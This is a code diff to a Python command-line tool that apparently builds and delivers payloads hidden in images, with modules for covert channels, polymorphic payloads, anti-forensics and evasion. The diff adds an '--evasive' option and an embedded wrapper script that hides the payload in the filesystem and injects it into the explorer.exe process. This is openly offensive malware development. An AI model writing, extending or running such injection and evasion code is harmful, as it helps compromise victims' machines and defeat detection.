@@ -20,6 +20,7 @@ from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
 from modules.anti_forensics import scorched_earth
 from modules.ape import unleash_ape
+from modules.evasion import inject_code, hide_in_filesystem, find_process_by_name
 import subprocess
 
 def load_config(config_path='config.json'):
@@ -61,6 +62,7 @@ def main():
     encode_parser.add_argument("--opap", action="store_true", help="Use Optimal Pixel Adjustment Process (OPAP)")
     encode_parser.add_argument("--morph", action="store_true", help="Morph the payload before encoding")
     encode_parser.add_argument("--polymorphic", action="store_true", help="Generate a polymorphic payload")
+    encode_parser.add_argument("--evasive", action="store_true", help="Use IMODE evasion techniques")
 
     decode_parser = subparsers.add_parser("decode-image", help="Extract payload from an image")
     decode_parser.add_argument("--input-image", required=True, help="Input image path")
@@ -96,6 +98,7 @@ def main():
     gen_payload_parser.add_argument("--obfuscate-method", default='base64', choices=['base64', 'xor'], help="Obfuscation method")
     gen_payload_parser.add_argument("--morph", action="store_true", help="Morph the payload")
     gen_payload_parser.add_argument("--polymorphic", action="store_true", help="Generate a polymorphic payload")
+    gen_payload_parser.add_argument("--evasive", action="store_true", help="Use IMODE evasion techniques")
     gen_payload_parser.add_argument("--output-file", help="File to save the generated payload")
 
     # Detect command
@@ -176,9 +179,31 @@ def main():
             payload_to_embed = args.payload.encode()
             if args.polymorphic:
                 base_payload = payload_to_embed
-                # In a real scenario, this might be shellcode or a python script
                 polymorphic_code = create_polymorphic_payload(base_payload.decode())
                 payload_to_embed = generate_encryption_stub(polymorphic_code.encode()).encode()
+
+            if args.evasive:
+                # This is a conceptual demonstration.
+                # An evasive payload would likely be a script that, when run,
+                # hides itself in the filesystem and then injects the final payload.
+                logging.info("Creating an evasive payload wrapper...")
+                evasive_wrapper = f"""
+import sys
+from modules.evasion import hide_in_filesystem, inject_code, find_process_by_name
+
+# The actual payload is embedded here
+final_payload = {payload_to_embed}
+
+# 1. Hide the payload in a cover file
+cover_file = hide_in_filesystem(final_payload)
+
+# 2. Inject the payload into a target process
+# (This is a simplified example)
+target_pid = find_process_by_name("explorer.exe")
+if target_pid:
+    inject_code(target_pid, final_payload)
+"""
+                payload_to_embed = evasive_wrapper.encode()
 
             encode_image(
                 input_path=args.input_image,
